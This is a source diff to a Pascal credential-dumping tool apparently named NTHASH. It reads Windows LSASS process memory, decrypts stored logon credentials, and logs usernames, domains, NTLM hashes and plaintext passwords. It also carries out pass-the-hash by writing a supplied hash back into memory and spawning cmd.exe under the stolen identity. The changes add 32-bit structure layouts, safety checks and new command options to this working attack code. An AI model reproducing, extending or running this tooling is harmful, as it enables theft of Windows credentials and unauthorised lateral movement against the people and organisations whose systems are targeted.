@@ -20,6 +20,7 @@ end;
        end;
     Pcredentialkeys=^_credentialkeys;
   type _CRED_NTLM_BLOCK=record
+       {$ifdef CPU64}
        domainlen1:word;
        domainlen2:word;
        unk1:dword;
@@ -31,6 +32,18 @@ end;
        unk3:dword;
        usernameoff:word;
        unk4:array[0..5] of byte;
+        {$endif CPU64}
+        {$ifdef CPU32}
+        domainlen1:word;
+        domainlen2:word;
+        domainoff:word;
+        unk1:word;
+        usernamelen1:word;
+        usernamelen2:word;
+        usernameoff:word;
+        unk3:word;
+        unk4:tbyte16;
+        {$endif CPU32}
        //+32
        ntlmhash:tbyte16; //array[0..15] of byte;
        lmhash:tbyte16; //array[0..15] of byte;
@@ -43,9 +56,9 @@ end;
 
   type _KIWI_MSV1_0_PRIMARY_CREDENTIALS =record
 	//probably a lsa_unicode_string len & bufer
-       len:word;
-       maxlen:word;
-       unk1:dword;
+       len:ushort;
+       maxlen:ushort;
+       //unk1:dword;
        Primary:pointer; //a string like Primary#0 or CredentialKeys#
        //
        Credentials:LSA_UNICODE_STRING; //buffer contains a cred_ntlm_block
@@ -562,7 +575,7 @@ var
   patch_pos:ShortInt=0;
   pattern:array of byte;
   logsesslist:array [0..sizeof(_KIWI_MSV1_0_LIST_63)-1] of byte;
-  bytes:array[0..1023] of byte;
+  bytes,bytes2:array[0..1023] of byte;
   password,decrypted,output:tbytes;
   username,domain:array [0..254] of widechar;
   credentials,ptr,first,current:nativeuint;
@@ -749,7 +762,7 @@ begin
                                      //encrypted password is $e0 aka 224 bytes later
                                      //start of credential structure is -$58
                                      //password - $110 is the pointer to the password
-                                     if CREDENTIALW.CredentialBlobSize>0 then
+                                     if (CREDENTIALW.CredentialBlobSize>0) and (nativeuint(CREDENTIALW.CredentialBlob)<>0) then
                                      begin
                                      log('CredentialBlob:'+inttohex(nativeuint(CREDENTIALW.CredentialBlob),sizeof(nativeuint)),0) ;
                                      setlength(password,CREDENTIALW.CredentialBlobSize);
@@ -787,14 +800,16 @@ begin
                                      log('CREDENTIALS.AuthID:'+inttohex (PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).AuthenticationPackageId,8 ),1);
                                      log('CREDENTIALS.PrimaryCredentialsPtr:'+inttohex(nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,sizeof(pointer))) ;
                                      //primary credentials...
-                                     ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,bytes );
+                                     ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+sizeof(pointer),bytes );
                                      //len will help us distinguish between "Primary" and "CredentialKeys"
                                      log('PrimaryCredentials.len:'+inttostr(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len) ) ;
                                      log('PrimaryCredentials.Primary:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).primary) ,sizeof(pointer))) ;
+                                     if readmem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).primary),bytes2)
+                                         then log('Primary Description:'+pchar(@bytes2[0]));
                                      log('PrimaryCredentials.Credentials.buffer:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer) ,sizeof(pointer))) ;
                                      log('PrimaryCredentials.Credentials.length:'+inttostr(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length )) ;
                                      //decrypt !
-                                     if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0 then
+                                     if (PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0) and (PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length<=1024) then
                                        begin
                                        setlength(password,PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length);
                                        ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),password );
@@ -810,11 +825,21 @@ begin
                                                           //log('usernameoff:'+inttostr(PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff)) ;
                                                           log('domain:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).domainoff]),1);
                                                           log('username:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),1);
+                                                          {$ifdef CPU64}
                                                           log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
+                                                          {$endif CPU64}
+                                                          {$ifdef CPU32}
+                                                          log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).unk4) ,1);
+                                                          {$endif CPU32}
                                                           //PTH time ! lets modify the crendential buffer and write it back to mem
                                                           if (luid<>0) and (hash<>'') then
                                                           begin
+                                                          {$ifdef CPU64}
                                                           PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte(hash);
+                                                          {$endif CPU64}
+                                                          {$ifdef CPU32}
+                                                          PCRED_NTLM_BLOCK(@decrypted[0]).unk4 :=HexaStringToByte(hash);
+                                                          {$endif CPU32}
                                                           encryptLSA(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,decrypted,output);
                                                           if writemem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),@output[0],PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length)
                                                              then log('PTH OK',1)
@@ -1005,13 +1030,13 @@ begin
                                    log('entry#next:'+dummy,0) ;
                                    log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
                                    //get username
-                                   ReadMem  (hprocess,i_logsesslist (logsesslist ).usernameptr,bytes );
-                                   copymemory(@username[0],@bytes[0],64);
-                                   log('username:'+widestring(username),1);
+                                   if ReadMem  (hprocess,i_logsesslist (logsesslist ).usernameptr,bytes )
+                                   //copymemory(@username[0],@bytes[0],64);
+                                      then log('username:'+strpas (pwidechar(@bytes[0])),1);
                                    //get domain
-                                   ReadMem  (hprocess,i_logsesslist (logsesslist ).domainptr,bytes );
-                                   copymemory(@domain[0],@bytes[0],64);
-                                   log('domain:'+widestring(domain),1);
+                                   if ReadMem  (hprocess,i_logsesslist (logsesslist ).domainptr,bytes )
+                                   //copymemory(@domain[0],@bytes[0],64);
+                                      then log('domain:'+strpas (pwidechar(@bytes[0])),1);
                                    //
                                    log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).maxlen3),1) ;
                                    if (i_logsesslist (logsesslist ).maxlen3>0) and (i_logsesslist (logsesslist ).usagecount>0) then
@@ -1020,7 +1045,7 @@ begin
                                      ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).maxlen3 );
                                      setlength(decrypted,1024);
                                      if decryptLSA (i_logsesslist (logsesslist ).maxlen3,password,decrypted)=true
-                                        then log(strpas (pwidechar(@decrypted[0]) ),1);
+                                        then log('Password:'+strpas (pwidechar(@decrypted[0]) ),1);
                                      end;
                                    //decryptcreds;
                                    //next
@@ -1136,7 +1161,7 @@ begin
   si.cb := sizeof(si);
   si.dwFlags := STARTF_USESHOWWINDOW;
   si.wShowWindow := 1;
-  bret:=CreateProcessWithLogonW(pwidechar(widestring(user)),pwidechar(widestring(domain)),pwidechar(widestring('dummy')),LOGON_NETCREDENTIALS_ONLY,nil,pwidechar('c:\windows\system32\cmd.exe'),CREATE_NEW_CONSOLE or CREATE_SUSPENDED ,nil,nil,@SI,@PI);
+  bret:=CreateProcessWithLogonW(pwidechar(widestring(user)),pwidechar(widestring(domain)),pwidechar(widestring('')),LOGON_NETCREDENTIALS_ONLY,nil,pwidechar('c:\windows\system32\cmd.exe'),CREATE_NEW_CONSOLE or CREATE_SUSPENDED ,nil,nil,@SI,@PI);
   if bret=false then writeln('failed: '+inttostr(getlasterror));
 
   if bret=true then
@@ -1197,6 +1222,9 @@ begin
   log('NTHASH /enumcred',1);
   log('NTHASH /enumcred2',1);
   log('NTHASH /enumvault',1);
+  log('NTHASH /bytestostring /input:hexabytes',1);
+  log('NTHASH /stringtobytes /input:string',1);
+  log('NTHASH /enumproc',1);
   log('NTHASH /cryptunprotectdata /binary:filename',1);
   log('NTHASH /cryptunprotectdata /input:string',1);
   log('NTHASH /cryptprotectdata /input:string',1);
